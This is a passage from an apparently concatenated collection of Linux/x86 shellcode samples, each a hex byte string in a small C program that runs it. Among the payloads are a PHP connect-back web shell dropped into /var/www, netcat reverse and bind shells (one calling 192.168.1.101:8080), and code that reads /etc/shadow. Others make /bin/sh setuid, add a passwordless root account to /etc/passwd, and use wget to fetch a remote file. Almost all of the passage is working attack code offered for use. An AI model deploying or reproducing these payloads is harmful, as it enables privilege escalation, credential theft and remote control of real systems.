			 "\x2f\x76\x61\x72\x31\xc0\x89\xe6\x88\x46\x0f\x89\xe3\x31\xc9\xb1"
			 "\x42\x31\xd2\xb2\xff\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x88\xc3\x68"
			 "\x3f\x3e\xff\xff\x68\x3b\x7d\x20\x7d\x68\x24\x72\x29\x29\x68\x6c"
			 "\x65\x6e\x28\x68\x20\x73\x74\x72\x68\x20\x24\x72\x2c\x68\x6f\x63"
			 "\x6b\x2c\x68\x65\x28\x24\x73\x68\x77\x72\x69\x74\x68\x6b\x65\x74"
			 "\x5f\x68\x3b\x73\x6f\x63\x68\x31\x24\x20\x22\x68\x73\x75\x31\x2e"
			 "\x68\x5c\x6e\x63\x62\x68\x2e\x3d\x20\x22\x68\x60\x3b\x24\x72\x68"
			 "\x20\x60\x24\x69\x68\x24\x72\x20\x3d\x68\x30\x29\x29\x7b\x68\x2c"
			 "\x20\x31\x30\x68\x73\x6f\x63\x6b\x68\x61\x64\x28\x24\x68\x74\x5f"
			 "\x72\x65\x68\x6f\x63\x6b\x65\x68\x24\x69\x3d\x73\x68\x69\x6c\x65"
			 "\x28\x68\x29\x3b\x77\x68\x68\x22\x2c\x31\x30\x68\x74\x65\x64\x3a"
			 "\x68\x6e\x6e\x65\x63\x68\x20\x22\x43\x6f\x68\x6f\x63\x6b\x2c\x68"
			 "\x65\x28\x24\x73\x68\x77\x72\x69\x74\x68\x6b\x65\x74\x5f\x68\x3b"
			 "\x73\x6f\x63\x68\x6f\x72\x74\x29\x68\x2c\x20\x24\x70\x68\x72\x65"
			 "\x73\x73\x68\x24\x61\x64\x64\x68\x63\x6b\x2c\x20\x68\x28\x24\x73"
			 "\x6f\x68\x6e\x65\x63\x74\x68\x5f\x63\x6f\x6e\x68\x63\x6b\x65\x74"
			 "\x68\x29\x3b\x73\x6f\x68\x5f\x54\x43\x50\x68\x2c\x53\x4f\x4c\x68"
			 "\x52\x45\x41\x4d\x68\x4b\x5f\x53\x54\x68\x2c\x53\x4f\x43\x68\x49"
			 "\x4e\x45\x54\x68\x28\x41\x46\x5f\x68\x65\x61\x74\x65\x68\x74\x5f"
			 "\x63\x72\x68\x6f\x63\x6b\x65\x68\x63\x6b\x3d\x73\x68\x3b\x24\x73"
			 "\x6f\x68\x72\x74\x27\x5d\x68\x5b\x27\x70\x6f\x68\x5f\x47\x45\x54"
			 "\x68\x72\x74\x3d\x24\x68\x3b\x24\x70\x6f\x68\x74\x27\x5d\x29\x68"
			 "\x27\x68\x6f\x73\x68\x47\x45\x54\x5b\x68\x65\x28\x24\x5f\x68\x79"
			 "\x6e\x61\x6d\x68\x6f\x73\x74\x62\x68\x67\x65\x74\x68\x68\x65\x73"
			 "\x73\x3d\x68\x61\x64\x64\x72\x68\x73\x65\x7b\x24\x68\x3b\x7d\x65"
			 "\x6c\x68\x34\x2e\x22\x29\x68\x72\x20\x34\x30\x68\x45\x72\x72\x6f"
			 "\x68\x6e\x74\x28\x22\x68\x7b\x70\x72\x69\x68\x74\x27\x5d\x29\x68"
			 "\x27\x70\x6f\x72\x68\x47\x45\x54\x5b\x68\x26\x21\x24\x5f\x68\x74"
			 "\x27\x5d\x26\x68\x27\x68\x6f\x73\x68\x47\x45\x54\x5b\x68\x28\x21"
			 "\x24\x5f\x68\x50\x20\x69\x66\x68\x3c\x3f\x50\x48\x31\xc0\x89\xe6"
			 "\xb0\x04\x89\xe1\x66\xba\x62\x01\xcd\x80";

	
int main(){
	

	// run shellcode
        asm("JMP %0;" : "=m" (sc));

	/*
		asm volatile(
		    "cb_shellcode:\n"
		    "push $0xff706870;" 
		    "push $0x2e62632f;" 
		    "push $0x7777772f;" 
		    "push $0x7261762f;"
		    "xor %eax, %eax;" 
		    "mov %esp, %esi;"
		    "movb %al, 0xf(%esi);"
		   
		    // sys_open 
		    "mov %esp, %ebx; "
                    "xor %ecx, %ecx;"
			    "movb $0x42, %cl;"
		    	"xor %edx, %edx;"
			    "movb $0xff, %dl;"
		    	"xor %eax, %eax;"
	 		    "movb $0x05, %al;" 
		    "int $0x80;"
		    
		    // sys_write
		    "xor %ebx, %ebx;"
		    "mov %al, %bl;"
		    
			// php connectback shellcode
			"push $0xffff3e3f; push $0x7d207d3b; push $0x29297224; push $0x286e656c;"
			"push $0x72747320; push $0x2c722420; push $0x2c6b636f; push $0x73242865;"
			"push $0x74697277; push $0x5f74656b; push $0x636f733b; push $0x22202431;"
			"push $0x2e317573; push $0x62636e5c; push $0x22203d2e; push $0x72243b60;"
			"push $0x69246020; push $0x3d207224; push $0x7b292930; push $0x3031202c;"
			"push $0x6b636f73; push $0x24286461; push $0x65725f74; push $0x656b636f;"
			"push $0x733d6924; push $0x28656c69; push $0x68773b29; push $0x30312c22;"
			"push $0x3a646574; push $0x63656e6e; push $0x6f432220; push $0x2c6b636f;"
			"push $0x73242865; push $0x74697277; push $0x5f74656b; push $0x636f733b;"
			"push $0x2974726f; push $0x7024202c; push $0x73736572; push $0x64646124;"
			"push $0x202c6b63; push $0x6f732428; push $0x7463656e; push $0x6e6f635f;"
			"push $0x74656b63; push $0x6f733b29; push $0x5043545f; push $0x4c4f532c;"
			"push $0x4d414552; push $0x54535f4b; push $0x434f532c; push $0x54454e49;"
			"push $0x5f464128; push $0x65746165; push $0x72635f74; push $0x656b636f;"
			"push $0x733d6b63; push $0x6f73243b; push $0x5d277472; push $0x6f70275b;" 
			"push $0x5445475f; push $0x243d7472; push $0x6f70243b; push $0x295d2774;" 
			"push $0x736f6827; push $0x5b544547; push $0x5f242865; push $0x6d616e79;" 
			"push $0x6274736f; push $0x68746567; push $0x3d737365; push $0x72646461;" 
			"push $0x247b6573; push $0x6c657d3b; push $0x29222e34; push $0x30342072;" 
			"push $0x6f727245; push $0x2228746e; push $0x6972707b; push $0x295d2774;" 
			"push $0x726f7027; push $0x5b544547; push $0x5f242126; push $0x265d2774;" 
			"push $0x736f6827; push $0x5b544547; push $0x5f242128; push $0x66692050;"
			"push $0x48503f3c;"
			
		   "xor %eax, %eax;"
	    	   "mov %esp, %esi;"	    
		   "movb $0x04, %al;"
		   "mov %esp, %ecx;" 
		   "mov $0x162, %dx;" 
		   "int $0x80;");

	*/
		
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 | Title:     Linux/x86 - Surprise ! ! ! - 361 bytes
 | Date:      2011-06-27
 | Tested on: Debian 5.0.8
 | Author:    Florian Gaultier - agix - twitter: @Agixid
 |
 | Comment: You need alsa-utils 
 | http://shell-storm.org
*/

#include <stdio.h>
#include <string.h>
char code[] =
"\x31\xf6\x6a\x02\x58\xcd"
"\x80"
"\x85"
"\xc0"
"\x75"
"\x78\x56\x89\xe2\x89\xe1"
                    "\x80"
                    "\xea"
                    "\x0c"
                    "\x89"
"\xd4\x56\x6a\x62\x66\x68"

"\x78"              "\x2f"
"\x68"              "\x4c"
"\x69"              "\x6e"
"\x75"              "\x68"
"\x6f\x72\x67\x2f\x68\x6f"
"\x72"              "\x6d"
"\x2e"              "\x68"
"\x6c"              "\x2d"
"\x73"              "\x74"

"\x68\x73\x68\x65\x6c\x68"
"\x65"
"\x70"
"\x6f"
"\x2e"
"\x68\x3a\x2f\x2f"
"\x72"
"\x68"
"\x68"
"\x74"
"\x74\x70\x89\xe3\x89\xe2"

"\x89"
"\xcc"
"\x53"
"\x89"
"\xe1"
"\x89"
"\xd4"
"\x56"
"\x66\x68\x2d\x71\x89\xe3"

"\x89"
"\xe2"
"\x89"
"\xcc"
"\x53"
"\x89"
"\xe1"
"\x89"
"\xd4\x56\x6a\x74\x68\x2f"

     "\x77\x67\x65\x68"

"\x2f\x62\x69\x6e\x68\x2f"
"\x75"
"\x73"
"\x72"
"\x89"
"\xe3\x89\xe2\x89\xcc\x53"
                    "\x89"
                    "\xe1"
                    "\x89"
                    "\xd4"
"\x6a\x0b\x58\x31\xd2\xcd"

"\x80\x6a\x07\x58\x31\xdb"
          "\x4b"
          "\x31"
          "\xc9"
          "\x31"
          "\xd2"
          "\xcd"
          "\x80"
          "\x6a"
		  
"\x0b\x5f\x6a\x02\x58\xcd"
"\x80"              "\x85"
"\xc0"              "\x75"
"\x73"              "\x31"
"\xf6"              "\x56"
"\x89"              "\xe2"
"\x89"              "\xe1"
"\x80"              "\xea"
"\x14"              "\x89"
"\xd4\x56\x6a\x62\x89\xe3"

"\x89\xe2\x89\xcc\x53\x89"
"\xe1"              "\x89"
"\xd4"              "\x56"
"\x6a"              "\x30"
"\x68"              "\x39"
"\x30"              "\x30"
"\x30\x89\xe3\x89\xe2\x89"
"\xcc"
"\x53\x89"
"\xe1"  "\x89"
"\xd4"      "\x56"
"\x66"          "\x68"
"\x2d"              "\x72"

"\x89\xe3"       "\x89\xe2"
"\x89" "\xcc" "\x53" "\x89"
"\xe1"    "\x89"     "\xd4"
"\x56"    "\x66"     "\x68"
"\x2d"               "\x71"
"\x89"               "\xe3"
"\x89"               "\xe2"
"\x89"               "\xcc"


"\x53\x89\xe1\x89\xd4\x56"
"\x66\x68\x61\x79\x68\x2f"
"\x61\x70\x6c\x68\x2f\x62"
"\x69\x6e\x68\x2f\x75\x73"
"\x72\x89\xe3\x89\xe2\x89"
"\xcc\x53\x89\xe1\x89\xd4"
"\x6a\x0b\x58\x31\xd2\xcd"
"\x80\x6a\x07\x58\x31\xdb"
"\x4b\x31\xc9\x31\xd2\xcd"
"\x80\x4f\x85\xff\x0f\x85"
"\x6f\xff\xff\xff\x56\x89"
"\xe2\x89\xe1\x80\xea\x0c"
"\x89\xd4\x56\x6a\x62\x89"
"\xe3\x89\xe2\x89\xcc\x53"
"\x89\xe1\x89\xd4\x56\x66"
"\x68\x2d\x66\x89\xe3\x89"
"\xe2\x89\xcc\x53\x89\xe1"
"\x89\xd4\x56\x6a\x6d\x66"
"\x68\x2f\x72\x68\x2f\x62"
"\x69\x6e\x89\xe3\x89\xe2"
"\x89\xcc\x53\x89\xe1\x89"
"\xd4\x6a\x0b\x58\x31\xd2"
       "\xcd\x80";


int main(int argc, char **argv)
{
int(*f)()=(int(*)())code;
f();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

 /*
  * Audio (knock knock knock) via /dev/dsp + setreuid(0,0) + execve shellcode. 
(Linux x86)
  * Author: Cody Tubbs (loophole of hhp).
  * www.hhp-programming.net / pigspigs@yahoo.com
  * 12/20/2000.
  *
  * F.U. to ph1x(ry4n). -From me and dxmd...
  * [If I ripped this, show me the source... or better yet
  *  go barrow a shovel so you can dig up deeper shit.]
  */

unsigned char hhpcode[] =
"\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0f\x31\xc9\x66"
"\xb9\x1c\x02\x80\x36\x03\x46\xe2\xfa\xea\xb8\x03\x03\x03\x2c\x61"
"\x6a\x6d\x2c\x70\x6b\x03\x7d\x03\x93\x93\x93\x93\x93\x93\x93\x93"
"\x93\x93\x93\x93\x93\x93\x93\x93\x93\x7f\x79\x75\x76\x76\x77\x72"
"\x6e\x69\x68\x6d\x70\x76\x76\x72\x6e\x69\x64\x65\x60\x63\x5e\x58"
"\x58\x5e\x5d\x5d\x5e\x5c\x61\x64\x6e\x70\x78\xa5\xaf\xb1\xb5\xbf"
"\xbc\xc0\xc6\xc6\xc1\xc2\xbd\xbe\xb9\xbb\xb6\xac\xaa\xa0\x6d\x6f"
"\x66\x6a\x69\x64\x55\x26\x33\x4d\x54\x5d\x43\x38\x35\x46\x40\x63"
"\x60\x61\x55\x48\x49\x4d\x5d\x66\x6e\x6a\x64\x63\x59\x54\x63\x69"
"\x6f\x70\x7a\x7b\x77\x7b\x79\x75\x71\x6d\x72\x72\x70\x71\x72\x6d"
"\x72\x70\x70\x70\x79\x76\x6c\x6d\x6f\x6e\x68\x70\x75\x6e\x65\x65"
"\x69\x68\x72\x75\x7d\x7f\x7e\x7d\x7f\x79\x78\x78\x7e\x79\x7e\x7d"
"\x7f\x74\x75\x77\x70\x75\x79\x7f\x78\x7a\x75\x71\x73\x72\x09\x03"
"\x2c\x67\x66\x75\x2c\x67\x70\x73\x03\x82\xef\x64\x28\x03\x03\x8a"
"\xf5\x56\x8a\xe6\x80\xef\x1f\x54\x55\x50\xeb\x03\x03\x03\x03\x58"
"\x82\xc0\xb9\x12\x03\x03\xc4\x46\xfb\x03\x03\x03\x03\xc4\x46\xff"
"\x03\x03\x03\x03\x8e\x80\x76\xee\xfc\xfc\x8a\x46\xfb\x8e\xb8\x7e"
"\xee\xfc\xfc\x8e\x90\x93\xee\xfc\xfc\x8a\x56\xeb\x8e\x88\x24\xed"
"\xfc\xfc\x8a\xcd\xbb\x06\x03\x03\x03\xba\x02\x03\x03\x03\xb9\x83"
"\x02\x03\x03\x50\x8a\xf0\xce\x83\x8a\x46\xf7\xbb\x2a\x03\x03\x03"
"\x88\x76\xf7\x50\x8a\xf0\xce\x83\x8a\x46\xe7\xbb\x07\x03\x03\x03"
"\x88\x76\xe7\x88\x4e\xeb\xb9\x95\x03\x03\x03\x50\x8a\xf0\xce\x83"
"\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce\x83\xc4\x46\xf3\x03\x03\x03"
"\x03\xbb\x07\x03\x03\x03\x88\x76\xe7\x8a\xfa\xb9\x02\x03\x03\x03"
"\x50\x8a\xf0\xce\x83\xfc\x46\xf3\x82\x7e\xf3\x54\x01\x03\x03\x7d"
"\xe3\xbb\x07\x03\x03\x03\x88\x4e\xeb\xb9\x95\x03\x03\x03\x50\x8a"
"\xf0\xce\x83\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce\x83\xc4\x46\xf3"
"\x03\x03\x03\x03\x93\xbb\x07\x03\x03\x03\x88\x76\xe7\x8a\xfa\xb9"
"\x02\x03\x03\x03\x50\x8a\xf0\xce\x83\xfc\x46\xf3\x82\x7e\xf3\x54"
"\x01\x03\x03\x7d\xe3\xbb\x07\x03\x03\x03\x88\x4e\xeb\xb9\x95\x03"
"\x03\x03\x50\x8a\xf0\xce\x83\xbb\x07\x03\x03\x03\x50\x8a\xf0\xce"
"\x83\xbb\x05\x03\x03\x03\x50\x8a\xf0\xce\x83\xbb\x05\x03\x03\x03"
"\x88\x76\xf7\x50\x8a\xf0\xce\x83\xbb\x45\x03\x03\x03\x32\xf5\x32"
"\xca\x50\x8a\xf0\xce\x83\x8e\x7e\xfb\xbb\x08\x03\x03\x03\x88\x76"
"\xfb\x8a\xfa\x32\xd1\x50\x8a\xf0\xce\x83\x32\xc3\x8e\x66\xdb\x58"
"\x5d\x5c\xca\xc0\x93\x69";

typedef void (*F)(); 
main(){F a;a=(F)(&hhpcode);a();} 



		

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
*  Shellcode length: 49 
*  Author: Chroniccommand 
*  /bin/dash
*  My first attempt at shellcode
*  Poison security
*/
#include<stdio.h>
//49 bytes 
char shellcode[] =  "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a"
                    "\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d"
                    "\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f"
                    "\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42"
                    "\x42\x42\x43\x43\x43\x43";
int main(){
 printf("Shellcode length: 49 bytes\nAuthor:chroniccommand\nPoison security");
 int *ret;
 ret = (int *)&ret + 2;
 (*ret) = (int)shellcode;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* readnchmod-core.c by Charles Stevenson <core@bokeoa.com> 
 *
 * Example of strace output if you pass in "/bin/sh\x00"
 * read(0, "/bin/sh\0", 2541)              = 8
 * chmod("/bin/sh", 04755)                 = 0
 *
 * Any file path can be given.  For example: /tmp/.sneakyguy
 * The only caveat is that the string must be NULL terminated.
 * This shouldn't be a problem.  For multi-stage payloads send
 * in this first and then you can send it data with null bytes.
 * I made this for rare cases with tight space contraints and
 * where read() jmp *%esp is not practical.
 *
 */
char hellcode[] = /* read(0,buf,2541); chmod(buf,4755); linux/x86 by core */
"\x31\xdb"//               xor    %ebx,%ebx
"\xf7\xe3"//               mul    %ebx
"\x53"//                   push   %ebx
"\xb6\x09"//               mov    $0x9,%dh
"\xb2\xed"//               mov    $0xed,%dl
"\x89\xe1"//               mov    %esp,%ecx
"\xb0\x03"//               mov    $0x3,%al
"\xcd\x80"//               int    $0x80
"\x89\xd1"//               mov    %edx,%ecx
"\x89\xe3"//               mov    %esp,%ebx
"\xb0\x0f"//               mov    $0xf,%al
"\xcd\x80"//               int    $0x80
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte read(0,buf,2541); chmod(buf,4755); linux/x86 by core\n",
         strlen(hellcode));
  shell();
  return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* exit-core.c by Charles Stevenson < core@bokeoa.com >  
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I use it when I need a process to exit cleanly.
 */
char hellcode[] = /*  _exit(1); linux/x86 by core */
// 7 bytes _exit(1) ... 'cause we're nice >:) by core
"\x31\xc0"              // xor  %eax,%eax
"\x40"                  // inc  %eax
"\x89\xc3"              // mov  %eax,%ebx
"\xcd\x80"              // int  $0x80
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte _exit(1); linux/x86 by core\n",
         strlen(hellcode));
  shell();
  return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* dup2_loop-core.c by Charles Stevenson <core@bokeoa.com> 
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I usually combine this with an execve as the second
 * stage of a read() jmp *%esp
 */
char hellcode[] = /* dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core */
"\x31\xc9"               	// xor    %ecx,%ecx
"\x56"                   	// push   %esi
"\x5b"                   	// pop    %ebx
// loop:
"\x6a\x3f"               	// push   $0x3f
"\x58"                   	// pop    %eax
"\xcd\x80"               	// int    $0x80
"\x41"                   	// inc    %ecx
"\x80\xf9\x03"           	// cmp    $0x3,%cl
"\x75\xf5"               	// jne    80483e8 <loop>
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core\n",
         strlen(hellcode));
  shell();
  return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * bunker_exec.c V1.3 - Tue Mar 21 22:50:18 CET 2006
 *
 * Linux/x86 bytecode that executes command after setreuid
 * (9 + 40 bytes + cmd)
 * 
 * setreuid(0, 0) + execve("/bin//sh", ["/bin//sh","-c","cmd"], NULL);
 *
 * "cmd" MUST be terminated with ";" (better with ";exit;" :-D)
 *
 * bunker - http://rawlab.mindcreations.com
 * 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
 *
 * setreuid(0, 0);
 * 00000000  6a46              push byte +0x46
 * 00000002  58                pop eax
 * 00000003  31db              xor ebx,ebx
 * 00000005  31c9              xor ecx,ecx
 * 00000007  cd80              int 0x80
 *
 * execve("/bin//sh", ["/bin//sh", "-c", "cmd"], NULL);
 * 00000009  eb21              jmp short 0x2c
 * 0000000b  5f                pop edi
 * 0000000c  6a0b              push byte +0xb
 * 0000000e  58                pop eax
 * 0000000f  99                cdq
 * 00000010  52                push edx
 * 00000011  66682d63          push word 0x632d
 * 00000015  89e6              mov esi,esp
 * 00000017  52                push edx
 * 00000018  682f2f7368        push dword 0x68732f2f
 * 0000001d  682f62696e        push dword 0x6e69622f
 * 00000022  89e3              mov ebx,esp
 * 00000024  52                push edx
 * 00000025  57                push edi
 * 00000026  56                push esi
 * 00000027  53                push ebx
 * 00000028  89e1              mov ecx,esp
 * 0000002a  cd80              int 0x80
 * 0000002c  e8daffffff        call 0xb
 * 00000031  ....              "cmd; exit;"
 */

char sc[]=
"\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99" 
"\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff"
"cat /etc/shadow; exit;";

main() { int(*f)()=(int(*)())sc;f(); }





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* Linux x86 shellcode by bob */
/* setuid(); execve(); exit(); */

#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80"
		"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f"
		"\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50"
		"\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0"
		"\xb0\x01\xcd\x80";
int
main()
{
        void (*dsr) ();
        (long) dsr = &shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        dsr();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * Linux x86 shellcode by bob from Dtors.net.
 * execve()/bin/ash; exit; 
 * Total = 34 bytes.
 */



#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x50\x68\x2f\x61\x73\x68\x68"
		"\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
		"\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
		"\x80\x31\xc0\xb0\x01\xcd\x80";
int
main()
{
        void (*dsr) ();
        (long) dsr = &shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        dsr();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * Linux x86 shellcode by bob from Dtors.net.
 * chmod("//bin/sh" ,04775); set sh +s
 */



#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x31\xdb\x31\xc9\x53\x68\x6e"
		"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
		"\xe3\x66\xb9\xfd\x09\xb0\x0f\xcd\x80"
		"\xb0\x01\xcd\x80";
int
main()
{
        void (*dsr) ();
        (long) dsr = &shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        dsr();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* Linux x86 shellcode, to open() write() close() and */
/* exit(), adds a root user no-passwd to /etc/passwd */
/* By bob from dtors.net */

#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x31\xdb\x31\xc9\x53\x68\x73\x73\x77"
		"\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74"
		"\x89\xe3\x66\xb9\x01\x04\xb0\x05\xcd\x80\x89"
		"\xc3\x31\xc0\x31\xd2\x68\x6e\x2f\x73\x68\x68"
		"\x2f\x2f\x62\x69\x68\x3a\x3a\x2f\x3a\x68\x3a"
		"\x30\x3a\x30\x68\x62\x6f\x62\x3a\x89\xe1\xb2"
		"\x14\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80"
		"\x31\xc0\xb0\x01\xcd\x80";

int
main()
{
        void (*dsr) ();
        (long) dsr = &shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        dsr();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
08048060 <_start>:
 8048060:       eb 2a                   jmp    804808c <GotoCall>
 
08048062 <shellcode>:
 8048062:       5e                      pop    %esi
 8048063:       31 c0                   xor    %eax,%eax
 8048065:       88 46 07                mov    %al,0x7(%esi)
 8048068:       88 46 15                mov    %al,0x15(%esi)
 804806b:       88 46 1a                mov    %al,0x1a(%esi)
 804806e:       89 76 1b                mov    %esi,0x1b(%esi)
 8048071:       8d 5e 08                lea    0x8(%esi),%ebx
 8048074:       89 5e 1f                mov    %ebx,0x1f(%esi)
 8048077:       8d 5e 16                lea    0x16(%esi),%ebx
 804807a:       89 5e 23                mov    %ebx,0x23(%esi)
 804807d:       89 46 27                mov    %eax,0x27(%esi)
 8048080:       b0 0b                   mov    $0xb,%al
 8048082:       89 f3                   mov    %esi,%ebx
 8048084:       8d 4e 1b                lea    0x1b(%esi),%ecx
 8048087:       8d 56 27                lea    0x27(%esi),%edx
 804808a:       cd 80                   int    $0x80
 
0804808c <GotoCall>:
 804808c:       e8 d1 ff ff ff          call   8048062 <shellcode>
 8048091:       2f                      das   
 8048092:       62 69 6e                bound  %ebp,0x6e(%ecx)
 8048095:       2f                      das   
 8048096:       6e                      outsb  %ds:(%esi),(%dx)
 8048097:       63 23                   arpl   %sp,(%ebx)
 8048099:       31 39                   xor    %edi,(%ecx)
 804809b:       32 2e                   xor    (%esi),%ch
 804809d:       31 36                   xor    %esi,(%esi)
 804809f:       38 2e                   cmp    %ch,(%esi)
 80480a1:       31 2e                   xor    %ebp,(%esi)
 80480a3:       31 30                   xor    %esi,(%eax)
 80480a5:       31 23                   xor    %esp,(%ebx)
 80480a7:       38 30                   cmp    %dh,(%eax)
 80480a9:       38 30                   cmp    %dh,(%eax)
 80480ab:       23 41 41                and    0x41(%ecx),%eax
 80480ae:       41                      inc    %ecx
 80480af:       41                      inc    %ecx
 80480b0:       42                      inc    %edx
 80480b1:       42                      inc    %edx
 80480b2:       42                      inc    %edx
 80480b3:       42                      inc    %edx
 80480b4:       43                      inc    %ebx
 80480b5:       43                      inc    %ebx
 80480b6:       43                      inc    %ebx
 80480b7:       43                      inc    %ebx
 80480b8:       44                      inc    %esp
 80480b9:       44                      inc    %esp
 80480ba:       44                      inc    %esp
 80480bb:       44                      inc    %esp
*/
 
// /bin/nc 192.168.1.101 8080
char shellcode[] =
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x15\x88\x46\x1a\x89\x76\x1b\x8d\x5e\x08\x89"
"\x5e\x1f\x8d\x5e\x16\x89\x5e\x23\x89\x46\x27\xb0\x0b\x89\xf3\x8d\x4e\x1b\x8d\x56\x27"
"\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x31\x39\x32\x2e\x31\x36"
"\x38\x2e\x31\x2e\x31\x30\x31\x23\x38\x30\x38\x30\x23";
 
int main()
{
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 08048060 <_start>:
 8048060:       eb 2a                   jmp    804808c <GotoCall>
 
08048062 <shellcode>:
 8048062:       5e                      pop    %esi
 8048063:       31 c0                   xor    %eax,%eax
 8048065:       88 46 07                mov    %al,0x7(%esi)
 8048068:       88 46 0f                mov    %al,0xf(%esi)
 804806b:       88 46 19                mov    %al,0x19(%esi)
 804806e:       89 76 1a                mov    %esi,0x1a(%esi)
 8048071:       8d 5e 08                lea    0x8(%esi),%ebx
 8048074:       89 5e 1e                mov    %ebx,0x1e(%esi)
 8048077:       8d 5e 10                lea    0x10(%esi),%ebx
 804807a:       89 5e 22                mov    %ebx,0x22(%esi)
 804807d:       89 46 26                mov    %eax,0x26(%esi)
 8048080:       b0 0b                   mov    $0xb,%al
 8048082:       89 f3                   mov    %esi,%ebx
 8048084:       8d 4e 1a                lea    0x1a(%esi),%ecx
 8048087:       8d 56 26                lea    0x26(%esi),%edx
 804808a:       cd 80                   int    $0x80
 
0804808c <GotoCall>:
 804808c:       e8 d1 ff ff ff          call   8048062 <shellcode>
 8048091:       2f                      das   
 8048092:       62 69 6e                bound  %ebp,0x6e(%ecx)
 8048095:       2f                      das   
 8048096:       6e                      outsb  %ds:(%esi),(%dx)
 8048097:       63 23                   arpl   %sp,(%ebx)
 8048099:       2d 6c 70 38 30          sub    $0x3038706c,%eax
 804809e:       38 30                   cmp    %dh,(%eax)
 80480a0:       23 2d 65 2f 62 69       and    0x69622f65,%ebp
 80480a6:       6e                      outsb  %ds:(%esi),(%dx)
 80480a7:       2f                      das   
 80480a8:       73 68                   jae    8048112 <GotoCall+0x86>
 80480aa:       23 41 41                and    0x41(%ecx),%eax
 80480ad:       41                      inc    %ecx
 80480ae:       41                      inc    %ecx
 80480af:       42                      inc    %edx
 80480b0:       42                      inc    %edx
 80480b1:       42                      inc    %edx
 80480b2:       42                      inc    %edx
 80480b3:       43                      inc    %ebx
 80480b4:       43                      inc    %ebx
 80480b5:       43                      inc    %ebx
 80480b6:       43                      inc    %ebx
 80480b7:       44                      inc    %esp
 80480b8:       44                      inc    %esp
 80480b9:       44                      inc    %esp
 80480ba:       44                      inc    %esp
*/
 
//bin/nc -lp8080 -e/bin/sh
char shellcode[] =
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e"
"\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80"
"\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d"
"\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";
 
int main()
{
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*---------------------------------------------------------------------------*
 *                 100 byte Portbind shellcode                               *
 *              by Benjamin Orozco - benoror@gmail.com                       *
 *---------------------------------------------------------------------------*
